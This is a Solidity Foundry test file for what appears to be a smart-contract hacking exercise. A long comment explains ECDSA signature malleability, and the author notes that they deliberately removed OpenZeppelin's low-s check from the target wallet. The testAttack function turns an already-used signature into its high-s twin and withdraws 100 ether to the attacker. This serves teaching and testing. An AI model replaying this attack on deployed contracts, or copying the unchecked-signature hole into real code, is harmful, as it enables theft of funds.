// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/EtherWallet.sol";

/**
 * To hack this contract, one has to understand how ECDSA signatures work:
 * Ethereum signatures consists of three integers: v, r and s
 *
 * ECDSA uses elliptic curves, which are symmetric over the x-axis
 * r is related to the x coordinate of the elliptic curve, while s is related to
 * the y coordinate.
 * ==>  This means if (r, s) is a valid signature, (r, n - s) is valid too:
 *
 * || 0 1 2 s0 4 | 5 s1 7 8 n ||  <== s0=3 and s1=6 are both valid
 *
 * We use v to find out which point to use, in Ethereum its either 0x1b (27)
 * for s < n/2, or 0x1c (28) for s > n/2
 * For the secp256k1 curve used in Ethereum (and Bitcoin) n is
 * 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
 *
 * Battle tested contracts, like OpenZeppelin's ECDSA library, enforce that
 * s is in the lower half, preventing the Signature malleability exploit
 * However, the built-in Ethereum function "ecrecover(hash, v, r, s)" does not
 * So, if theres an existing tx on the blockchain with values v, r and s
 * we can simply compute the other valid s and adjust v accordingly, e.g.
 * if s < n/2, compute s_new = n - s and change v from 27 to 28
 *
 * Sidenote: I intentionally added the OpenZeppelin ECDSA library, but removed the
 * important part which would prevent this exploit
 *
 * More info: http://coders-errand.com/malleability-ecdsa-signatures/
 */
contract EtherWalletTest is Test {
    EtherWallet internal etherwallet;

    bytes32 private rUsed;
    bytes32 private sUsed;

    bytes private signature;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event Withdraw(address indexed _to, uint256 indexed value);

    function setUp() public {
        // compute address for a given privatekey
        address alice = vm.addr(10);
        vm.deal(alice, 1000 ether);

        // alice deploys EtherWallet and becomes owner
        vm.startPrank(alice);
        etherwallet = new EtherWallet{value: 100 ether}();

        // alice signs a message and calls withdraw, enabling the exploit
        bytes32 hash = keccak256("\x19Ethereum Signed Message:\n32");
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(10, hash);
        signature = abi.encodePacked(r, s, v);

        emit log_bytes(signature);

        vm.expectEmit(true, true, false, false);
        emit Withdraw(alice, 100 ether);
        etherwallet.withdraw(signature);

        // give contract ether again
        (bool sent, ) = address(etherwallet).call{value: 100 ether}("");
        require(sent, "Failed to send Ether");

        vm.stopPrank();

        // store values for attack
        rUsed = r;
        sUsed = s;
    }

    function testRevert() public {
        // reverts when signature used twice
        vm.expectRevert("Signature already used!");
        etherwallet.withdraw(signature);
    }

    function testAttack() public {
        // vm.sign returns the lower s (this also means that v=27), so we compute n - s
        bytes32 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
        bytes32 sNew = bytes32(uint256(n) - uint256(sUsed));

        // set v to 28 since we now use s in the upper half
        uint8 vNew = 28;

        // exploit the contract
        vm.expectEmit(true, true, false, false);
        emit Withdraw(address(this), 100 ether);
        bytes memory newSignature = abi.encodePacked(rUsed, sNew, vNew);
        etherwallet.withdraw(newSignature);

        emit log_bytes(newSignature);
    }

    // we have to include this so withdraw doesnt throw an error
    receive() external payable {}
}
